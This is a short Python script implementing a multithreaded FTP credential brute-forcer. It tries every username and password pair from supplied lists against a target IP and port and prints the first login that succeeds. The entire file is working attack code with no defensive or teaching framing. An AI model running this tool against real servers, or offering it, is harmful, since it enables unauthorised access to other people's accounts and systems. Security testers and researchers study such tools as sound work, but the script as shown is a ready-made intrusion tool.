import ftplib
from threading import Thread, activeCount
import time
from colorama import Fore
import sys

class Ftp:
    def __init__(self, ip, port, usernames, passwords, maxthr):
        self.ip = ip
        self.port = port
        self.usernames = usernames
        self.passwords = passwords
        self.maxthr = maxthr
        self.isdone = False

        for u in self.usernames:
            for p in self.passwords:
                if(self.isdone == True):
                    break
                if(activeCount() >= self.maxthr):
                    time.sleep(4)
                th = Thread(target=self.is_correct,args=(u,p))
                th.start()
            if(self.isdone == True):
                break
        
        print(Fore.LIGHTGREEN_EX + "[+] Finished")

    def is_correct(self,user,password):
        server = ftplib.FTP()
        try:
            server.connect(self.ip, self.port, timeout=5)
            server.login(user, password)
        except ftplib.error_perm:
            pass
        else:
            self.isdone = True
            print(Fore.GREEN + f"\n[+] {user}:{password}")